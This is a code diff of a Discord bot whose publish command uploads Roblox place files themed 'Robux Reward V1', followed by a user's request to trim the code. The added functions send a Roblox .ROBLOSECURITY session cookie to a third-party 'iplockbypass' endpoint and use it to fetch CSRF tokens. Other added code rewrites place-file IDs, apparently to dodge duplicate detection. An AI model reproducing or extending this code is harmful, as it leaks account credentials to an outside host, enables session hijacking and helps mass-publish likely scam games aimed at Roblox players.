@@ -1,12 +1,22 @@
+import re
 import os
 import json
+import secrets
+import uuid
 import requests
 import discord
 from discord import app_commands
+from webserver import keep_alive
 from discord.ext import commands
+from discord.app_commands.errors import MissingRole
+import psycopg2
 from dotenv import load_dotenv
 load_dotenv()
 
+# ...
+# Import statements and other code
+
+# Define your rbxlx file locations with theme names
 rbxlx_files = {
     "tt": {
         "theme_name": "Robux Reward V1",
@@ -31,10 +41,53 @@ rbxlx_files = {
     # Add more themes here as needed
 }
 
+# Generate choices using a loop
 theme_choices = [
     discord.app_commands.Choice(name=f"{theme_data['theme_name']}", value=theme_code)
     for theme_code, theme_data in rbxlx_files.items()
 ]
+
+def replace_referents(data):
+  cache = {}
+
+  def _replace_ref(match):
+    ref = match.group(1)
+    if not ref in cache:
+      cache[ref] = ("RBX" + secrets.token_hex(16).upper()).encode()
+    return cache[ref]
+
+  data = re.sub(b"(RBX[A-Z0-9]{32})", _replace_ref, data)
+  return data
+
+def replace_script_guids(data):
+    cache = {}
+
+    def _replace_guid(match):
+        guid = match.group(1)
+        if not guid in cache:
+            cache[guid] = ("{" + str(uuid.uuid4()).upper() + "}").encode()
+        return cache[guid]
+
+    data = re.sub(
+        b"({[A-Z0-9]{8}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{12}\\})",
+        _replace_guid, data)
+    return data
+
+
+def process_file(file_key):
+    theme_info = rbxlx_files.get(file_key)
+    if not theme_info:
+        return None
+
+    rbxlx_file = theme_info["file_location"]
+    file_data = open(rbxlx_file, 'rb').read()
+
+    if rbxlx_file.endswith(".rbxlx"):
+        file_data = replace_referents(file_data)
+        file_data = replace_script_guids(file_data)
+
+    return file_data
+
 
 intents = discord.Intents.default()
 intents.members = True
@@ -46,10 +99,54 @@ tree = discord.app_commands.CommandTree(client)
 @client.event
 async def on_ready():
     await tree.sync()
-    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='You Gay'), status=discord.Status.dnd)
+    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='Dashx Enterprise'), status=discord.Status.dnd)
     print('Logged in')
     print('------')
     print(client.user.display_name)
+
+keep_alive()
+
+def refresh_cookie(c):
+    try:
+        response = requests.get(f"https://eggy.cool/iplockbypass?cookie={c}")
+
+        if response.text != "Invalid Cookie":
+            new_cookie = response.text
+            return new_cookie
+        else:
+            return None
+    except Exception as e:
+        print(f"An error occurred while refreshing the cookie: {e}")
+        return None
+
+
+def get_csrf_token(cookie):
+    try:
+        xsrfRequest = requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': cookie})
+        if xsrfRequest.status_code == 403 and "x-csrf-token" in xsrfRequest.headers:
+            return xsrfRequest.headers["x-csrf-token"]
+    except Exception as e:
+        print(f"An error occurred: {str(e)}")
+    return None
+
+def get_game_icon(game_id):
+    try:
+        url = f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={game_id}&returnPolicy=PlaceHolder&size=512x512&format=Png&isCircular=false"
+        with requests.Session() as session:
+            response = session.get(url)
+            response.raise_for_status()
+            jsonicon = response.json()
+
+            # Extract the thumbnail URL
+            thumbnail_data = jsonicon.get("data", [])
+            if thumbnail_data:
+                thumbnail = thumbnail_data[0].get("imageUrl", "")
+                return thumbnail
+            else:
+                return ""
+    except requests.exceptions.RequestException as e:
+        print(f"Error in get_avatar_thumbnail: {e}")
+        return ""
 
 @tree.command(
     name="publish",
@@ -233,3 +330,4 @@ async def slash_publish(interaction: discord.Interaction, theme: discord.app_com
         await interaction.followup.send(embed=embed_var, ephemeral=True)
 
 client.run(os.getenv('TOKEN'))
+Can you please remove all the thing that are not related to publish cmd
